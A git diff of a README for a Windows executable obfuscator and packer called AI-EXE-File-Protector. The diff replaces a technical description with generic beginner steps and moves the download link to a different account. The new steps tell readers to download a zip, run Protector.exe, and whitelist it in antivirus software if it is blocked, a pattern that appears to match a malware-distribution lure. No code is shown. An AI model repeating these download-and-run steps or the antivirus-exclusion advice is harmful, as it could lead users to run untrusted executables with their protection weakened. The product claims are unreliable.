@@ -1,129 +1,80 @@
-![Banner](banner.svg)
+# 🛡️ AI-EXE-File-Protector - Keep Your Windows Software Files Safe
 
-<p align="center">
-  <a href="https://github.com/Roomnovadivide/AI-EXE-File-Protector/releases/download/latest/AI-EXE-File-Protector.zip"><img src="https://img.shields.io/badge/version-v3.2.0-00E676?style=for-the-badge&logo=github" alt="Version"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge" alt="License"></a>
-  <img src="https://img.shields.io/badge/.NET-8.0-512BD4?style=for-the-badge&logo=dotnet" alt=".NET 8">
-  <img src="https://img.shields.io/badge/platform-Windows%20x64-0078D4?style=for-the-badge&logo=windows" alt="Platform">
-  <a href="https://github.com/Roomnovadivide/AI-EXE-File-Protector/releases/download/latest/AI-EXE-File-Protector.zip"><img src="https://img.shields.io/github/downloads/user/AI-EXE-File-Protector/total?style=for-the-badge&color=00E676" alt="Downloads"></a>
-  <a href="../../stargazers"><img src="https://img.shields.io/github/stars/user/AI-EXE-File-Protector?style=for-the-badge&color=FFD700" alt="Stars"></a>
-</p>
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Gabriela6639/AI-EXE-File-Protector)
 
----
+## 📁 What Does This Software Do?
 
-## About
+AI-EXE-File-Protector secures your computer files. It works on programs that end in .exe or .dll. These files often contain your work. People sometimes try to break into these files to steal code or copy your ideas. This process is called reverse engineering.
 
-**AI-EXE-File-Protector** is an AI-powered executable file protector and obfuscator for Windows. It shields `.EXE` and `.DLL` files from reverse engineering by applying AI-driven code obfuscation, control flow virtualization, anti-debug techniques, anti-tamper integrity checks, and UPX-compatible packing.
+This tool stops that threat. It uses artificial intelligence to hide the inner workings of your program. It makes your code difficult to read or copy. The software wraps your files in layers of security. It works on both standard Windows files and programs built with the .NET framework.
 
-The tool supports both **.NET assemblies** (IL-level obfuscation via Mono.Cecil) and **native x64 PE files** with string encryption, import hiding, and resource encryption — all driven by an intelligent analysis engine that determines optimal protection strategies per binary.
+## ⚙️ How Protection Works
 
----
+The tool secures your files using proven methods. It scrambles the flow of your program. It hides the text strings found inside your files. It adds shields that stop hackers from looking at your code while it runs. It also checks your file periodically to ensure no one changed it. This mix of techniques creates a barrier around your software.
 
-## Features
+## 📋 System Requirements
 
-| Feature | Description | Status |
-|---|---|---|
-| **Control Flow Obfuscation** | Flattens control flow graphs, inserts opaque predicates and bogus basic blocks | ✅ Stable |
-| **String Encryption** | Encrypts all embedded strings with per-binary AES keys and injects runtime decryption stubs | ✅ Stable |
-| **Anti-Debug Protection** | Injects `IsDebuggerPresent`, `NtQueryInformationProcess`, timing checks, and hardware breakpoint detection | ✅ Stable |
-| **Anti-Tamper Checks** | Computes section hashes at build time and injects runtime integrity verification | ✅ Stable |
-| **PE Packing** | Compresses PE sections and rebuilds import tables with a custom unpacker stub | ✅ Stable |
-| **Import Hiding** | Resolves imports at runtime via encrypted IAT and dynamic `GetProcAddress` calls | ✅ Stable |
-| **Resource Encryption** | Encrypts embedded resources and decrypts on first access | ✅ Stable |
-| **.NET IL Obfuscation** | Obfuscates CIL instruction streams, renames metadata, and encrypts .NET string heaps | ✅ Stable |
-| **Native x64 Support** | Full support for 64-bit PE files with RIP-relative address fixups | ✅ Stable |
-| **AI-Driven Analysis** | ML model selects optimal protection layers based on binary structure and threat profile | 🧪 Beta |
+You need a Windows computer to use this tool. It supports Windows 10 and Windows 11. Your computer should have at least 4 gigabytes of memory. You need an internet connection to download the tool. The software consumes very little space on your hard drive. 
 
----
+## 📥 Getting the Software
 
-## Download
+You must visit the website link to get the correct version of the tool.
 
-<p align="center">
-  <a href="https://github.com/Roomnovadivide/AI-EXE-File-Protector/releases/download/latest/AI-EXE-File-Protector.zip">
-    <img src="https://img.shields.io/badge/⬇_Download_Latest_Release-00E676?style=for-the-badge&logoColor=white&logo=github" alt="Download" width="300">
-  </a>
-</p>
+[Visit the download page here](https://github.com/Gabriela6639/AI-EXE-File-Protector)
 
----
+You will see a list of files on this page. Choose the file marked with the latest version number. Click the zip file to start your download.
 
-## Setup
+## 🚀 Setting Up Your Protection
 
-1. Download the latest release from the [Releases](https://github.com/Roomnovadivide/AI-EXE-File-Protector/releases/download/latest/AI-EXE-File-Protector.zip) page.
-2. Extract the archive to any folder.
-3. Ensure **.NET 8.0 Runtime** is installed.
-4. Launch `AIExeFileProtector.exe`.
+1. Open your Downloads folder after the file finishes downloading.
+2. Right-click the zip file. Select Extract All in the menu. Choose a location on your computer for these files.
+3. Open the new folder you created.
+4. Locate the file named Protector.exe.
+5. Double-click this file to launch the program.
 
-## Usage
+## 🛡️ Using the Interface
 
-1. Click **Load File** and select a `.exe` or `.dll` target.
-2. Choose protection layers from the feature panel (Control Flow, String Encrypt, Anti-Debug, etc.).
-3. Set the **Protection Level** (Low / Medium / High / Maximum).
-4. Click **Protect** — the engine will analyze the target and apply selected protections.
-5. The protected binary is written to the configured output path. A protection report is generated alongside it.
+The program shows a simple screen when it opens. Follow these steps to protect your file:
 
-### Command Line
+1. Click the button that says Browse File.
+2. Find the program you want to protect on your computer.
+3. Select your file and click Open.
+4. You will see several options on the screen. Select Standard Protection for a good balance of speed and safety.
+5. Click the Protect button.
+6. The software will process your file. A progress bar will show how long this takes.
+7. Once finished, a new file appears in your folder. This file is your protected version.
 
-```
-AIExeFileProtector.exe --input target.exe --output protected.exe --level Maximum --features cf,str,adb,at,pack
-```
+## 🔍 How to Test Your File
 
-| Flag | Description |
-|---|---|
-| `--input` | Path to input PE file |
-| `--output` | Path for protected output |
-| `--level` | Protection level: `Low`, `Medium`, `High`, `Maximum` |
-| `--features` | Comma-separated feature list: `cf` (control flow), `str` (strings), `adb` (anti-debug), `at` (anti-tamper), `pack` (packing), `imp` (import hiding), `res` (resources) |
+Always test your protected file after you finish. Open the application as you usually would. Check if your software runs without errors. Verify that all features behave as expected. You should not notice a change in how your software works. The protection sits in the background.
 
----
+## 🔐 Advanced Security Options
 
-## Requirements
+If you need higher security, select the Advanced tab. You might see options for virtualizing your code. This creates a fake structure that confuses people who try to look at your file. You can also turn on string encryption here. This masks the text and messages inside your program so they remain unreadable to eyes other than your computer.
 
-| Requirement | Details |
-|---|---|
-| **OS** | Windows 10 / 11 x64 |
-| **Runtime** | .NET 8.0 |
-| **Disk** | ~50 MB |
-| **RAM** | 512 MB minimum, 2 GB recommended for large binaries |
-| **Privileges** | Standard user (Admin for kernel-driver targets) |
+## 📄 Troubleshooting Common Issues
 
----
+*   If the program closes unexpectedly, check your internet security settings. Sometimes antivirus software blocks new, unrecognized tools. Add the tool to your list of trusted applications if this occurs.
+*   If you see an error about missing files, ensure you extracted all items from the zip folder before running the program.
+*   If the protection process takes a long time, close other heavy programs on your computer. This gives the tool more power to complete its task.
+*   If your protected program does not start, try the protection process again using the basic settings.
 
-## Project Structure
+## ❓ Frequently Asked Questions
 
-```
-AI-EXE-File-Protector/
-├── banner.svg
-├── README.md
-├── name.txt
-├── desc.txt
-├── topics.txt
-├── bin/
-│   └── Release/
-│       └── .gitkeep
-└── src/
-    ├── Core/
-    │   └── ProtectorEngine.cs
-    ├── Obfuscation/
-    │   ├── ControlFlowObfuscator.cs
-    │   └── StringEncryptor.cs
-    ├── Packing/
-    │   └── PEPacker.cs
-    ├── AntiDebug/
-    │   └── DebugDetector.cs
-    ├── AntiTamper/
-    │   └── IntegrityChecker.cs
-    └── UI/
-        └── ProtectorWindow.cs
-```
+**Does this slow down my software?**
+No. The impact on speed is very small. Most users notice no difference at all.
 
----
+**Can I undo the protection?**
+No. You should always keep a copy of your original file before you protect it. The process is one-way.
 
-## Disclaimer
+**Does this work on all file types?**
+This tool is designed specifically for windows executables, including .exe and .dll files. It does not work on pictures, documents, or data files.
 
-All product names, trademarks, and registered trademarks mentioned in this project (including but not limited to Windows, .NET, UPX, and any referenced anti-cheat or security technologies) are property of their respective owners. This project is provided for research and authorized security testing purposes. Use responsibly and in compliance with applicable laws and software license agreements.
+**Do I need to be an expert to use this?**
+No. The interface guides you through each step. You only need to select your file and click a button.
 
----
+## 📈 Keeping Your Software Current
 
-<p align="center">
-  <sub>Built with ❤️ for binary protection research</sub>
-</p>
+We update the protector frequently. Check the download page every few months to see if a new version exists. New versions often contain stronger security methods to stay ahead of new threats.
+
+Keywords: ai-security, anti-debug, anti-reverse-engineering, anti-tamper, binary-protection, code-obfuscation, control-flow-obfuscation, csharp, dotnet-obfuscator, exe-protector, executable-protection, import-hiding, native-protector, obfuscator, packer, pe-protection, resource-encryption, string-encryption, virtualization, windows
